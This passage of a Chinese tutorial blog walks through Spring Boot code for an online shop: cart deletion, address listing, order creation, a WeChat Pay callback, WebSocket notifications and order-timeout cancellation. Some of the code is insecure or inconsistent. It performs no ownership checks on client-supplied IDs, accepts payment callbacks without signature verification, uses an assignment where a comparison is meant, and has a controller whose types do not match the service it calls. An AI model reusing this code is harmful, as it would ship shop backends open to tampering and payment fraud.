<h4 id="删除购物车"><a href="#删除购物车" class="headerlink" title="删除购物车"></a>删除购物车</h4><ul>
<li><p>sql</p>
<p>删除数据时，可以批量删除也可以是单个删除，因此使用下面的sql语句</p>
<pre><code class="hljs mysql">delete from shopping_cart where cart_id IN (10,11)</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">deleteShopcartByCids</span><span class="hljs-params">(List&lt;Integer&gt; cids)</span></span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteShopcartByCids&quot;</span>&gt;</span>
  delete from shopping_cart where cart_id in
  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;cids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;cid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span>
    #&#123;cid&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">deleteShoppingCartsByCids</span><span class="hljs-params">(String cids)</span> </span>&#123;
    <span class="hljs-comment">// 将前端请求携带的字符串转换成int数组</span>
    List&lt;Integer&gt; cartIds = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);
    <span class="hljs-keyword">for</span> (String string : strings) &#123;
        cartIds.add(Integer.parseInt(string));
    &#125;
    <span class="hljs-keyword">int</span> i = shoppingCartMapper.deleteShopcartByCids(cartIds);
    <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> ResultVO.success();
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;删除失败！&quot;</span>);
    &#125;
&#125;</code></pre>



</li>
</ul>
<ul>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/delete&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">deletebycids</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;
    ResultVO resultVO = shoppingCartService.deleteShoppingCartsByCids(cids);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>
</li>
<li><p>前端代码</p>
<p>由于该功能没有再前端实现因此在shopcart.html页面中加入如下js代码    </p>
<pre><code class="hljs js">deleteByIds: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.opts.length == <span class="hljs-number">0</span>) &#123;
        alert(<span class="hljs-string">&quot;请选择要购买的商品！&quot;</span>)
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">//1.获取选择购物车记录的id [0,2]  ---&gt;  cartId 8   cartId 10 --- 8,10,</span>
        <span class="hljs-keyword">var</span> cids = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.opts.length; i++) &#123;
            <span class="hljs-keyword">var</span> index = <span class="hljs-built_in">this</span>.opts[i];
            <span class="hljs-keyword">var</span> cartId = <span class="hljs-built_in">this</span>.shopcarts[index].cartId;
            <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-built_in">this</span>.opts.length - <span class="hljs-number">1</span>) &#123;
                cids = cids + cartId + <span class="hljs-string">&quot;,&quot;</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                cids = cids + cartId;
            &#125;
        &#125;
        <span class="hljs-keyword">var</span> url = baseUrl + <span class="hljs-string">&quot;shopcart/delete/?cids=&quot;</span> + cids;
        axios(&#123;
            url: url,
            method: <span class="hljs-string">&quot;get&quot;</span>,
            headers: &#123;
                token: <span class="hljs-built_in">this</span>.token
            &#125;
        &#125;).then(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;
            <span class="hljs-built_in">console</span>.log(res);
            <span class="hljs-keyword">if</span> (res.data.code = <span class="hljs-number">10000</span>) &#123;
                <span class="hljs-comment">//重新刷新购物车</span>
                <span class="hljs-built_in">this</span>.getShoppingCartList();
            &#125;
        &#125;);
    &#125;
&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714134933507.png" alt="image-20220714134933507"></p>
<p>接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714135115137.png" alt="image-20220714135115137"></p>
</li>
</ul>
<h3 id="1-10-收货地址"><a href="#1-10-收货地址" class="headerlink" title="1.10 收货地址"></a>1.10 收货地址</h3><h4 id="获取收获地址"><a href="#获取收获地址" class="headerlink" title="获取收获地址"></a>获取收获地址</h4><p>直接根据用户id即可获取到收获地址，所以这里直接使用tkMapper生成的即可。</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional(propagation = Propagation.SUPPORTS)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listAddrsByUid</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userId)</span> </span>&#123;
    Example example = <span class="hljs-keyword">new</span> Example(UserAddr.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;userId&quot;</span>,userId);
    criteria.andEqualTo(<span class="hljs-string">&quot;status&quot;</span>,<span class="hljs-number">1</span>);

    List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example);
    ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, userAddrs);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">list</span><span class="hljs-params">(Integer userId,<span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;
    ResultVO resultVO = userAddrService.listAddrsByUid(userId);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>



</li>
</ul>
<h3 id="1-11-订单业务"><a href="#1-11-订单业务" class="headerlink" title="1.11 订单业务"></a>1.11 订单业务</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714172108540.png" alt="image-20220714172108540"></p>
<h4 id="订单添加接口"><a href="#订单添加接口" class="headerlink" title="订单添加接口"></a>订单添加接口</h4><ul>
<li><p>数据库操作</p>
<ul>
<li>根据收获地址的id，获取地址信息</li>
<li>根据购物车id，查询购物车的详细信息（关联商品名称，sku，库存，商品图片，价格），用于生成订单快照</li>
<li>保存订单</li>
<li>保存商品快照</li>
<li>修改库存</li>
</ul>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 保存订单业务</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cids</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> order</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> SQLException</span>
<span class="hljs-comment">     */</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addOrder</span><span class="hljs-params">(String cids, Orders order)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;
    <span class="hljs-comment">//处理cids</span>
    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);
    List&lt;Integer&gt; cidsInt = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
    <span class="hljs-keyword">for</span> (String string : strings) &#123;
        cidsInt.add(Integer.parseInt(string));
    &#125;
    <span class="hljs-comment">// 查询与当前订单相关联的购物车记录</span>
    List&lt;ShoppingCartVO&gt; shopcartList = shoppingCartMapper.selectShopcartByCids(cidsInt);

    <span class="hljs-comment">// 判断商品库存是否充足</span>
    <span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">true</span>;
    String untitle = <span class="hljs-string">&quot;&quot;</span>;  <span class="hljs-comment">// 保存所有商品的名称 最后保存到订单快照中</span>
    <span class="hljs-keyword">for</span> (ShoppingCartVO cartVO : shopcartList) &#123;
        <span class="hljs-keyword">if</span>(Integer.parseInt(cartVO.getCartNum()) &gt; cartVO.getSkuStock())&#123;
            flag = <span class="hljs-keyword">false</span>;
        &#125;
        untitle = untitle + cartVO.getProductName() + <span class="hljs-string">&quot;,&quot;</span>;
    &#125;


    <span class="hljs-keyword">if</span>(flag)&#123;
        <span class="hljs-comment">// 库存充足 则保存订单</span>
        <span class="hljs-comment">// userId</span>
        <span class="hljs-comment">// untitle</span>
        <span class="hljs-comment">// 支付时间</span>
        <span class="hljs-comment">// 收货人的信息</span>
        <span class="hljs-comment">// 总价格</span>
        <span class="hljs-comment">// 支付方式（1）</span>
        <span class="hljs-comment">// 支付状态（待支付）</span>
        order.setUntitled(untitle);
        order.setCancelTime(<span class="hljs-keyword">new</span> Date());
        order.setStatus(<span class="hljs-string">&quot;1&quot;</span>);
        String orderId = UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);
        order.setOrderId(orderId);
        <span class="hljs-keyword">int</span> i = ordersMapper.insert(order);

        <span class="hljs-comment">// 生成商品快照</span>
        <span class="hljs-keyword">for</span> (ShoppingCartVO sc: shopcartList) &#123;
            <span class="hljs-keyword">int</span> cnum = Integer.parseInt(sc.getCartNum());
            String itemId = System.currentTimeMillis()+<span class="hljs-string">&quot;&quot;</span>+ (<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">89999</span>)+<span class="hljs-number">10000</span>);
            OrderItem orderItem = <span class="hljs-keyword">new</span> OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), <span class="hljs-keyword">new</span> BigDecimal(sc.getSellPrice()), cnum, <span class="hljs-keyword">new</span> BigDecimal(sc.getSellPrice() * cnum), <span class="hljs-keyword">new</span> Date(), <span class="hljs-keyword">new</span> Date(), <span class="hljs-number">0</span>);
            orderItemMapper.insert(orderItem);
            <span class="hljs-comment">//增加商品销量</span>
        &#125;

        <span class="hljs-comment">// 扣减库存</span>
        <span class="hljs-comment">// 使用当前库存减去商品数量</span>
        <span class="hljs-keyword">for</span> (ShoppingCartVO cartVO : shopcartList) &#123;
            String skuId = cartVO.getSkuId();
            <span class="hljs-keyword">int</span> newStock = cartVO.getSkuStock() - Integer.parseInt(cartVO.getCartNum());

            Example example = <span class="hljs-keyword">new</span> Example(ProductSku.class);
            Example.Criteria criteria = example.createCriteria();
            criteria.andEqualTo(<span class="hljs-string">&quot;skuId&quot;</span>, skuId);
            <span class="hljs-comment">//                ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId);</span>
            <span class="hljs-comment">//                productSku.setStock(newStock);</span>
            <span class="hljs-comment">//                int k = productSkuMapper.updateByExample(productSku, example);</span>
            ProductSku productSku = <span class="hljs-keyword">new</span> ProductSku();
            productSku.setStock(newStock);
            productSku.setSkuId(skuId);
            <span class="hljs-keyword">int</span> k = productSkuMapper.updateByPrimaryKeySelective(productSku);
        &#125;
        <span class="hljs-comment">//购买完成后 删除对应的购物车数据</span>
        <span class="hljs-keyword">for</span> (Integer cid : cidsInt) &#123;
            shoppingCartMapper.deleteByPrimaryKey(cid);
        &#125;

        <span class="hljs-keyword">return</span> ResultVO.success(<span class="hljs-string">&quot;生成订单成功！&quot;</span>, orderId);
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;商品库存不足，请重新选择！&quot;</span>);
    &#125;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java">    <span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span>
<span class="hljs-comment">//    @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;购物车id&quot;,required = true)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">list</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestBody</span> Orders order)</span></span>&#123;
        System.out.println(<span class="hljs-string">&quot;##################&quot;</span>);
        System.out.println(cids);
        <span class="hljs-keyword">if</span>(cids.contains(<span class="hljs-string">&quot;#&quot;</span>))&#123;
            cids.replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);
        &#125;
        System.out.println(cids);
        <span class="hljs-keyword">try</span> &#123;
            Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order);
            String orderId = orderInfo.get(<span class="hljs-string">&quot;orderId&quot;</span>);

            <span class="hljs-keyword">if</span>(orderId !=<span class="hljs-keyword">null</span>)&#123;
                Map&lt;String , String&gt; data = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
                data.put(<span class="hljs-string">&quot;body&quot;</span>,orderInfo.get(<span class="hljs-string">&quot;productNames&quot;</span>)); <span class="hljs-comment">//商品描述</span>
                data.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>,orderId); <span class="hljs-comment">//使⽤当前⽤户订单的编号作为当前⽀付交易的交易号</span>
                data.put(<span class="hljs-string">&quot;fee_type&quot;</span>,<span class="hljs-string">&quot;CNY&quot;</span>); <span class="hljs-comment">//⽀付币种</span>
                data.put(<span class="hljs-string">&quot;total_fee&quot;</span>, order.getActualAmount()*<span class="hljs-number">100</span> + <span class="hljs-string">&quot;&quot;</span> ); <span class="hljs-comment">//⽀付⾦额</span>
                data.put(<span class="hljs-string">&quot;trade_type&quot;</span>,<span class="hljs-string">&quot;NATIVE&quot;</span>); <span class="hljs-comment">//交易类型</span>
                data.put(<span class="hljs-string">&quot;notify_url&quot;</span>,<span class="hljs-string">&quot;/pay/success&quot;</span>); <span class="hljs-comment">//设置⽀付完成时的回调⽅法</span>
                WXPay wxPay = <span class="hljs-keyword">new</span> WXPay(<span class="hljs-keyword">new</span> MyPayConfig());
                Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); <span class="hljs-comment">//发送请求</span>
                System.out.println(resp);
                String code_url = resp.get(<span class="hljs-string">&quot;code_url&quot;</span>);
                orderInfo.put(<span class="hljs-string">&quot;code_url&quot;</span>, code_url);
                <span class="hljs-keyword">return</span> ResultVO.success(orderInfo);
            &#125;<span class="hljs-keyword">else</span> &#123;
                <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;订单为空！&quot;</span>);
            &#125;
        &#125; <span class="hljs-keyword">catch</span> (SQLException throwables) &#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;添加订单失败！&quot;</span>);
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;添加订单失败！&quot;</span>);
        &#125;
    &#125;</code></pre>

</li>
</ul>
<h4 id="支付回调"><a href="#支付回调" class="headerlink" title="支付回调"></a>支付回调</h4><blockquote>
<p>当用户支付成功后，支付平台会向服务器的指定接口发送支付订单的支付状态数据</p>
</blockquote>
<ul>
<li><p>创建控制器并定义回调接口</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.controller;

<span class="hljs-keyword">import</span> com.github.wxpay.sdk.WXPayUtil;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.entity.Orders;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.service.OrderService;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.swagger.annotations.Api;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParam;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> javax.servlet.ServletInputStream;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/pay&quot;)</span>
<span class="hljs-meta">@Api(value = &quot;用户地址接口&quot;,tags = &quot;用户地址管理&quot;)</span>
<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PayController</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@GetMapping(&quot;/callable&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">success</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
        ServletInputStream is = request.getInputStream();
        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];
        <span class="hljs-keyword">int</span> len = -<span class="hljs-number">1</span>;
        StringBuilder builder = <span class="hljs-keyword">new</span> StringBuilder();
        <span class="hljs-keyword">while</span>((len = is.read(bytes)) != -<span class="hljs-number">1</span>)&#123;
            builder.append(<span class="hljs-keyword">new</span> String(bytes, <span class="hljs-number">0</span> ,len));
        &#125;
        String s = builder.toString();
        <span class="hljs-comment">// 使用wxpay的工具类讲xml的响应结果 转换成map</span>
        Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s);
        <span class="hljs-keyword">if</span>(map != <span class="hljs-keyword">null</span>  &amp;&amp; <span class="hljs-string">&quot;success&quot;</span>.equalsIgnoreCase(map.get(<span class="hljs-string">&quot;result_code&quot;</span>)))&#123;
            <span class="hljs-comment">// 支付成功</span>
            <span class="hljs-comment">// 修改订单状态为代发货/已支付</span>
            String orderId = map.get(<span class="hljs-string">&quot;out_trade_no&quot;</span>);
            <span class="hljs-keyword">int</span> i = orderService.updateOrderStatus(orderId, <span class="hljs-string">&quot;2&quot;</span>);
            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;
                <span class="hljs-comment">// 响应微信平台</span>
                HashMap&lt;String, String&gt; resp = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
                resp.put(<span class="hljs-string">&quot;return_code&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);
                resp.put(<span class="hljs-string">&quot;return_msg&quot;</span>, <span class="hljs-string">&quot;OK&quot;</span>);
                resp.put(<span class="hljs-string">&quot;appid&quot;</span>, map.get(<span class="hljs-string">&quot;appid&quot;</span>));
                resp.put(<span class="hljs-string">&quot;result_code&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);
                String s1 = WXPayUtil.mapToXml(resp);
                <span class="hljs-keyword">return</span> s1;
            &#125;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
    &#125;

&#125;
</code></pre>





</li>
</ul>
<ul>
<li><p>设置回调的url</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715163058828.png" alt="image-20220715163058828"></p>
</li>
</ul>
<p>** 这里涉及到内网穿透的知识点，但是如果部署到云服务器上的可以忽略这一步</p>
<h4 id="订单状态查询"><a href="#订单状态查询" class="headerlink" title="订单状态查询"></a>订单状态查询</h4><p>该接口实现比较简单</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getOrderById</span><span class="hljs-params">(String orderId)</span> </span>&#123;
    Orders orders = ordersMapper.selectByPrimaryKey(orderId);
    <span class="hljs-keyword">return</span> ResultVO.success(orders.getStatus());
&#125;
</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/status/&#123;oid&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getStatus</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;oid&quot;)</span> String oid, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span> String token)</span></span>&#123;
    <span class="hljs-keyword">return</span> orderService.getOrderById(oid);
&#125;</code></pre>

<p>测试接口</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715173458440.png" alt="image-20220715173458440"></p>
</li>
</ul>
<h4 id="websocket消息推送"><a href="#websocket消息推送" class="headerlink" title="websocket消息推送"></a>websocket消息推送</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715174726117.png" alt="image-20220715174726117"></p>
<p>创建webSocket服务器</p>
<ul>
<li><p>添加依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>添加websocket服务节点配置（Java配置⽅式）</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.websocket;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.socket.server.standard.ServerEndpointExporter;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketConfig</span> </span>&#123;

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ServerEndpointExporter <span class="hljs-title">getServerEndpointExporter</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ServerEndpointExporter();
    &#125;

&#125;
</code></pre>



</li>
</ul>
<ul>
<li><p>创建websocket服务器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.websocket;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> javax.websocket.OnClose;
<span class="hljs-keyword">import</span> javax.websocket.OnOpen;
<span class="hljs-keyword">import</span> javax.websocket.Session;
<span class="hljs-keyword">import</span> javax.websocket.server.PathParam;
<span class="hljs-keyword">import</span> javax.websocket.server.ServerEndpoint;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;

<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@ServerEndpoint(&quot;/webSocket/&#123;oid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketServer</span> </span>&#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;String,Session&gt; sessionMap = <span class="hljs-keyword">new</span> ConcurrentHashMap&lt;&gt;();

    <span class="hljs-comment">/**前端发送请求建立websocket连接，就会执行<span class="hljs-doctag">@OnOpen</span>方法**/</span>
    <span class="hljs-meta">@OnOpen</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-meta">@PathParam(&quot;oid&quot;)</span> String orderId, Session session)</span></span>&#123;
        System.out.println(<span class="hljs-string">&quot;------------建立连接：&quot;</span>+orderId);
        sessionMap.put(orderId,session);
    &#125;

    <span class="hljs-comment">/**前端关闭页面或者主动关闭websocket连接，都会执行close**/</span>
    <span class="hljs-meta">@OnClose</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-meta">@PathParam(&quot;oid&quot;)</span> String orderId)</span></span>&#123;
        sessionMap.remove(orderId);
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendMsg</span><span class="hljs-params">(String orderId,String msg)</span></span>&#123;
        <span class="hljs-keyword">try</span> &#123;
            Session session = sessionMap.get(orderId);
            session.getBasicRemote().sendText(msg);
        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;

&#125;
</code></pre>
</li>
<li><p>在PayController中添加使用websocket与前端通信的代码</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715223718929.png" alt="image-20220715223718929"></p>
</li>
</ul>
<h4 id="订单超时取消-定时任务"><a href="#订单超时取消-定时任务" class="headerlink" title="订单超时取消-定时任务"></a>订单超时取消-定时任务</h4><blockquote>
<p>当用户提交订单后，没有在规定时间内进行支付操作，该订单讲自动取消，还原商品库存信息</p>
<ul>
<li>定时任务(quartz）</li>
<li>延时队列（MQ）</li>
</ul>
</blockquote>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715224137251.png" alt="image-20220715224137251" style="zoom:67%;">

<blockquote>
<pre><code class="hljs reasonml">首先查询已失效的未支付订单
订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时，
如果订单的创建时间不在此范围内则属于失效的订单
需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能
出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若已经支付则修改支付状态为已支付（<span class="hljs-number">2</span>）
若仍然是未支付则取消订单，取消订单后需要修改订单状态 为支付失败(<span class="hljs-number">6</span>)，并向支付平台通知取消支付链接，恢复商品的库存，就是<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ProductSku</span>.</span></span>stock + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">OrderItem</span>.</span></span>buy_conuts
这里需要考虑到数据库的并发问题，需要加锁和事务管理，隔离级别是 串行化，以保证数据的正确性和一致性</code></pre>
</blockquote>
<ul>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional(isolation = Isolation.SERIALIZABLE)</span> <span class="hljs-comment">//  隔离级别是 串行化</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeOrder</span><span class="hljs-params">(String orderId)</span> </span>&#123;
    <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>)&#123;
        Orders orders = ordersMapper.selectByPrimaryKey(orderId);
        orders.setStatus(<span class="hljs-string">&quot;6&quot;</span>);
        orders.setCloseType(<span class="hljs-number">1</span>); <span class="hljs-comment">// 失败原因未支付</span>
        <span class="hljs-comment">// 将订单状态改为支付失败</span>
        ordersMapper.updateByPrimaryKeySelective(orders);
        <span class="hljs-comment">// 根据订单id查询商品快照</span>
        Example example = <span class="hljs-keyword">new</span> Example(OrderItem.class);
        Example.Criteria criteria = example.createCriteria();
        criteria.andEqualTo(<span class="hljs-string">&quot;orderId&quot;</span>, orderId);
        List&lt;OrderItem&gt; orderItems = orderItemMapper.selectByExample(example);

        <span class="hljs-keyword">for</span> (OrderItem orderItem : orderItems) &#123;
            String skuId = orderItem.getSkuId();
            ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId);
            productSku.setStock(productSku.getStock() + orderItem.getBuyCounts());
            productSkuMapper.updateByPrimaryKeySelective(productSku);
        &#125;
    &#125;
&#125;</code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Scheduled(cron = &quot;0/60 * * * * ?&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkAndCloseOrder</span><span class="hljs-params">()</span> </span>&#123;
    <span class="hljs-comment">// 首先查询已失效的未支付订单</span>
    <span class="hljs-comment">// 订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时，</span>
    <span class="hljs-comment">// 如果订单的创建时间不在此范围内则属于失效的订单</span>
